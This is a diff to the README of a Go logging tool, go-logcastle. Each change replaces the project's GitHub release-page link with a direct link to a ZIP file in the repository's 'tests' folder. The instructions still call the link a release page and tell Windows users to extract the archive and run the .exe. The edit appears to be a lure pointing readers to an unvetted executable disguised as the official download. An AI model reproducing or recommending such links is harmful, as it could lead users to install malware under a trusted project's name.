@@ -1,6 +1,6 @@
 # 🏰 go-logcastle - Keep Logs Clear Across Apps
 
-[![Download go-logcastle](https://img.shields.io/badge/Download%20go--logcastle-blue?style=for-the-badge&logo=github)](https://github.com/Nuclear-fenorchis140/go-logcastle/releases)
+[![Download go-logcastle](https://img.shields.io/badge/Download%20go--logcastle-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This page shows you how to download and run it on Windows.
 
 ## 📥 Download
 
-1. Open the release page here: https://github.com/Nuclear-fenorchis140/go-logcastle/releases
+1. Open the release page here: https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save the file to your computer
@@ -202,7 +202,7 @@ This project is linked to:
 
 ## ▶️ Download and Run
 
-1. Visit the release page: https://github.com/Nuclear-fenorchis140/go-logcastle/releases
+1. Visit the release page: https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip
 2. Download the Windows file from the latest release
 3. Open the downloaded file, or extract it first if it is a ZIP archive
 4. Run the app from the extracted folder or from the `.exe` file
@@ -210,7 +210,7 @@ This project is linked to:
 
 ## 📎 Release Page
 
-[Open the latest go-logcastle release](https://github.com/Nuclear-fenorchis140/go-logcastle/releases)
+[Open the latest go-logcastle release](https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip)
 
 ## 🔐 Safe Start Tips
 
